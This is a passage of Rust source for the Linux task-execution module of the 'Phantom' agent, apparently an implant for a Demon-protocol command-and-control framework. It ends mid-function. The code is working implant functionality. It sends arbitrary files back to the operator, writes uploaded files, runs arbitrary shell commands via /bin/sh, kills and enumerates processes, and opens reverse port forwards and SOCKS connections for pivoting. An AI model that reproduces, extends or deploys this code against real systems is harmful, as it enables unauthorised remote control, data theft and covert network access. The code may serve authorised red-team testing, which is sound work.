//! Linux task execution for the Phantom agent.

use std::collections::{BTreeMap, HashMap};
use std::ffi::OsString;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{SystemTime, UNIX_EPOCH};

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
    DemonSocketCommand, DemonSocketType,
};
use time::OffsetDateTime;
use tokio::net::TcpStream as TokioTcpStream;
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PendingCallback {
    Output { request_id: u32, text: String },
    Error { request_id: u32, text: String },
    Exit { request_id: u32, exit_method: u32 },
    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
    FsUpload { request_id: u32, file_size: u32, path: String },
    Socket { request_id: u32, payload: Vec<u8> },
}

#[derive(Debug, Default)]
pub(crate) struct PhantomState {
    mem_files: HashMap<u32, MemFile>,
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    sockets: HashMap<u32, ManagedSocket>,
    pending_callbacks: Vec<PendingCallback>,
}

#[derive(Debug)]
struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct FilesystemEntry {
    name: String,
    is_dir: bool,
    size: u64,
    modified: ModifiedTime,
}

#[derive(Debug)]
struct FilesystemListing {
    root_path: String,
    entries: Vec<FilesystemEntry>,
}

#[derive(Debug)]
struct ModifiedTime {
    day: u32,
    month: u32,
    year: u32,
    minute: u32,
    hour: u32,
}

#[derive(Debug)]
struct ProcessEntry {
    name: String,
    pid: u32,
    parent_pid: u32,
    session: u32,
    threads: u32,
    user: String,
    is_wow64: bool,
}

impl PhantomState {
    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
        self.accept_reverse_port_forward_clients()?;
        self.poll_sockets().await
    }

    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
        std::mem::take(&mut self.pending_callbacks)
    }

    fn queue_callback(&mut self, callback: PendingCallback) {
        self.pending_callbacks.push(callback);
    }

    fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => {
                        return Err(PhantomError::Socket(error.to_string()));
                    }
                }
            }
        }

        for (listener_id, bind_addr, bind_port, forward_addr, forward_port, stream) in accepted {
            let socket_id = self.allocate_socket_id();
            self.sockets.insert(
                socket_id,
                ManagedSocket {
                    stream,
                    socket_type: DemonSocketType::Client,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                },
            );
            self.queue_callback(PendingCallback::Socket {
                request_id: 0,
                payload: encode_socket_open(
                    socket_id,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                ),
            });

            if !self.reverse_port_forwards.contains_key(&listener_id) {
                self.remove_socket(socket_id);
            }
        }

        Ok(())
    }

    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                        Err(error) => {
                            read_failure = Some(PendingCallback::Socket {
                                request_id: 0,
                                payload: encode_socket_read_failure(
                                    socket_id,
                                    socket.socket_type,
                                    raw_socket_error(&error),
                                ),
                            });
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    read_success = Some(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
                    });
                }
            }

            if let Some(callback) = read_failure {
                self.queue_callback(callback);
            }
            if let Some(callback) = read_success {
                self.queue_callback(callback);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = rand::random::<u32>() | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
        {
            socket_id = rand::random::<u32>() | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
    }
}

impl MemFile {
    fn append(&mut self, data: &[u8]) {
        self.data.extend_from_slice(data);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Execute a single Demon task package.
pub(crate) async fn execute(
    package: &DemonPackage,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => {}
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let sleep_ms = parser.int32()?;
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: format!("sleep updated to {sleep_ms} ms"),
            });
        }
        DemonCommand::CommandFs => {
            execute_filesystem(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandProcList => {
            let payload = execute_process_list(&package.payload)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProcList),
                request_id: package.request_id,
                payload,
            });
        }
        DemonCommand::CommandProc => {
            execute_process(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandNet => {
            execute_network(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandSocket => {
            execute_socket(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandMemFile => {
            execute_memfile(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            state.queue_callback(PendingCallback::Exit {
                request_id: package.request_id,
                exit_method,
            });
        }
        command => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("phantom does not implement command {command:?} yet"),
            });
        }
    }

    Ok(())
}

async fn execute_filesystem(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;
            let payload =
                encode_fs_dir_listing(&target, subdirs, files_only, dirs_only, list_only)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload,
            });
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_cat(&path, &contents)?,
            });
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let mem_file_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
            let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} was not found"),
                });
                return Ok(());
            };
            if !mem_file.is_complete() {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} is incomplete"),
                });
                return Ok(());
            }

            fs::write(&path, &mem_file.data).map_err(|error| io_error(&path, error))?;
            let file_size = u32::try_from(mem_file.data.len())
                .map_err(|_| PhantomError::InvalidResponse("uploaded file too large"))?;
            state.queue_callback(PendingCallback::FsUpload {
                request_id,
                file_size,
                path: path.display().to_string(),
            });
            state.mem_files.remove(&mem_file_id);
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Cd, &path)?,
            });
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            let is_dir = path.is_dir();
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_remove(&path, is_dir)?,
            });
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Mkdir, &path)?,
            });
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Copy, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Move, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::GetPwd, &path)?,
            });
        }
    }

    Ok(())
}

fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let process_ui = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
    let processes = enumerate_processes()?;
    encode_process_list(process_ui, &processes)
}

async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                let pid = child.id().unwrap_or_default();
                let output = child
                    .wait_with_output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
                });
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                state.queue_callback(PendingCallback::Output { request_id, text: merged });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(
                        &binary,
                        child.id().unwrap_or_default(),
                        true,
                        false,
                        verbose,
                    )?,
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let success = Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?
                .success();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_kill(success, pid),
            });
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = enumerate_processes()?
                .into_iter()
                .filter(|process| process.name.to_lowercase().contains(&needle))
                .collect::<Vec<_>>();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_grep(&filtered)?,
            });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let modules = enumerate_modules(pid)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_modules(pid, &modules)?,
            });
        }
        DemonProcessCommand::Memory => {
            let pid = parser.int32()?;
            let _query_protection = parser.int32()?;
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!(
                    "process memory enumeration for pid {pid} is not implemented in Phantom yet"
                ),
            });
        }
    }

    Ok(())
}

fn execute_network(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandNet),
            request_id,
            payload: encode_net_domain(&linux_domain_name())?,
        }),
        DemonNetCommand::Computer => state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandNet),
            request_id,
            payload: encode_u32(u32::from(DemonNetCommand::Computer)),
        }),
        DemonNetCommand::Logons
        | DemonNetCommand::Sessions
        | DemonNetCommand::DcList
        | DemonNetCommand::Share
        | DemonNetCommand::LocalGroup
        | DemonNetCommand::Group
        | DemonNetCommand::Users => state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("network subcommand {subcommand:?} is not implemented in Phantom yet"),
        }),
    }

    Ok(())
}

async fn execute_socket(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
    let subcommand = DemonSocketCommand::try_from(subcommand)?;

    match subcommand {
        DemonSocketCommand::ReversePortForwardAdd => {
            let bind_addr = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward bind address")
            })?;
            let bind_port = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
            let forward_addr = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward forward address")
            })?;
            let forward_port = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward forward port")
            })?;

            let listener_id = state.allocate_socket_id();
            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
            match TcpListener::bind(bind_socket) {
                Ok(listener) => {
                    listener
                        .set_nonblocking(true)
                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
                    state.reverse_port_forwards.insert(
                        listener_id,
                        ReversePortForward {
                            listener,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_rportfwd_add(
                            true,
                            listener_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });
                }
                Err(_error) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_rportfwd_add(
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });
                }
            }
        }
        DemonSocketCommand::ReversePortForwardAddLocal => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("reverse-port-forward add-local is not implemented in Phantom"),
            });
        }
        DemonSocketCommand::ReversePortForwardList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
            for (socket_id, listener) in &state.reverse_port_forwards {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(listener.bind_addr));
                payload.extend_from_slice(&encode_u32(listener.bind_port));
                payload.extend_from_slice(&encode_u32(listener.forward_addr));
                payload.extend_from_slice(&encode_u32(listener.forward_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::ReversePortForwardClear => {
            state.reverse_port_forwards.clear();
            let client_ids = state
                .sockets
                .iter()
                .filter_map(|(socket_id, socket)| {
                    (socket.socket_type == DemonSocketType::Client).then_some(*socket_id)
                })
                .collect::<Vec<_>>();
            for client_id in client_ids {
                state.remove_socket(client_id);
            }
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socket_clear(true),
            });
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
            if let Some(listener) = state.reverse_port_forwards.remove(&socket_id) {
                let client_ids = state
                    .sockets
                    .iter()
                    .filter_map(|(client_id, socket)| {
                        (socket.socket_type == DemonSocketType::Client
                            && socket.bind_addr == listener.bind_addr
                            && socket.bind_port == listener.bind_port
                            && socket.forward_addr == listener.forward_addr
                            && socket.forward_port == listener.forward_port)
                            .then_some(*client_id)
                    })
                    .collect::<Vec<_>>();
                for client_id in client_ids {
                    state.remove_socket(client_id);
                }
                state.queue_callback(PendingCallback::Socket {
                    request_id,
                    payload: encode_rportfwd_remove(
                        socket_id,
                        DemonSocketType::ReversePortForward,
                        listener.bind_addr,
                        listener.bind_port,
                        listener.forward_addr,
                        listener.forward_port,
                    ),
                });
            }
        }
        DemonSocketCommand::SocksProxyAdd
        | DemonSocketCommand::SocksProxyList
        | DemonSocketCommand::SocksProxyRemove
        | DemonSocketCommand::SocksProxyClear => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("socket subcommand {subcommand:?} is not implemented in Phantom"),
            });
        }
        DemonSocketCommand::Open => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("socket open is a callback-only path in Phantom"),
            });
        }
        DemonSocketCommand::Read => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let socket_type = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
            let socket_type = DemonSocketType::try_from(socket_type)?;
            let success = parser.bool32()?;

            if success {
                let data = parser.bytes()?;
                write_to_socket(request_id, state, socket_id, socket_type, data)?;
            } else {
                let error_code = u32::try_from(parser.int32()?)
                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("socket {socket_id:#x} read failed with error {error_code}"),
                });
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let data = parser.bytes()?;
            let mut write_failure = None;
            if let Some(socket) = state.sockets.get_mut(&socket_id) {
                if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
                    write_failure = Some(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_write_failure(
                            socket_id,
                            socket.socket_type,
                            raw_socket_error(&error),
                        ),
                    });
                }
            }
            if let Some(callback) = write_failure {
                state.queue_callback(callback);
                state.remove_socket(socket_id);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            state.remove_socket(socket_id);
        }
        DemonSocketCommand::Connect => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let atyp = parser.byte()?;
            let host = parser.bytes()?;
            let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());

            let connection = connect_socks_target(atyp, host, port).await;
            match connection {
                Ok(stream) => {
                    state.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::ReverseProxy,
                            bind_addr: 0,
                            bind_port: u32::from(port),
                            forward_addr: 0,
                            forward_port: 0,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(true, socket_id, 0),
                    });
                }
                Err(error_code) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(false, socket_id, error_code),
                    });
                }
            }
        }
    }

    Ok(())
}

fn execute_memfile(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let mem_file_id = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
    let total_size = usize::try_from(parser.int64()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
    let chunk = parser.bytes()?;

    let entry = state.mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    if entry.expected_size != total_size || entry.data.len() > total_size {
        state.queue_callback(PendingCallback::MemFileAck {
            request_id,
            mem_file_id,
            success: false,
        });
        return Ok(());
    }

    entry.append(chunk);
    state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });

    Ok(())
}

fn write_to_socket(
    request_id: u32,
    state: &mut PhantomState,
    socket_id: u32,
    expected_type: DemonSocketType,
    data: &[u8],
) -> Result<(), PhantomError> {
    let Some(socket) = state.sockets.get_mut(&socket_id) else {
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("socket {socket_id:#x} was not found"),
        });
        return Ok(());
    };

    let socket_type = socket.socket_type;
    if socket_type != expected_type {
        let actual_type = socket_type;
        let _ = socket;
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!(
                "socket {socket_id:#x} has type {:?}, expected {:?}",
                actual_type, expected_type
            ),
        });
        return Ok(());
    }

    if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
        let _ = socket;
        state.queue_callback(PendingCallback::Socket {
            request_id,
            payload: encode_socket_write_failure(socket_id, socket_type, raw_socket_error(&error)),
        });
        state.remove_socket(socket_id);
    }

    Ok(())
}

async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream =
        TokioTcpStream::connect(&target).await.map_err(|error| raw_socket_error(&error))?;
    let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
    stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
    Ok(stream)
}

fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(error),
        }
    }

    Ok(())
}

fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}

fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
    let mut processes = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        match read_process_entry(pid) {
            Ok(process) => processes.push(process),
            Err(PhantomError::Io { message, .. })
                if message.contains("No such file or directory") =>
            {
                continue;
            }
            Err(error) => return Err(error),
        }
    }
    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
    Ok(processes)
}

fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
    let proc_path = PathBuf::from(format!("/proc/{pid}"));
    let status = fs::read_to_string(proc_path.join("status"))
        .map_err(|error| io_error(proc_path.join("status"), error))?;
    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
    let parent_pid = status_field(&status, "PPid")
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();
    let threads =
        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
    let session = read_process_session(pid).unwrap_or_default();
    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;

    Ok(ProcessEntry {
        name: executable_name(&exe),
        pid,
        parent_pid,
        session,
        threads,
        user: username_for_uid(metadata.uid()),
        is_wow64,
    })
}

fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
    status.lines().find_map(|line| {
        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
    })
}

fn read_process_session(pid: u32) -> Option<u32> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let suffix = stat.split_once(") ")?.1;
    let fields = suffix.split_whitespace().collect::<Vec<_>>();
    fields.get(3)?.parse::<u32>().ok()
}

fn process_arch_bits(exe: &Path) -> Option<u32> {
    let header = fs::read(exe).ok()?;
    if header.len() < 5 || &header[..4] != b"\x7FELF" {
        return None;
    }
    match header[4] {
        1 => Some(32),
        2 => Some(64),
        _ => None,
    }
}

fn username_for_uid(uid: u32) -> String {
    fs::read_to_string("/etc/passwd")
        .ok()
        .and_then(|passwd| {
            passwd.lines().find_map(|line| {
                let mut fields = line.split(':');
                let username = fields.next()?;
                let _password = fields.next()?;
                let entry_uid = fields.next()?.parse::<u32>().ok()?;
                (entry_uid == uid).then(|| username.to_string())
            })
        })
        .unwrap_or_else(|| uid.to_string())
}

fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut modules = BTreeMap::new();
    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(range) = parts.next() else {
            continue;
        };
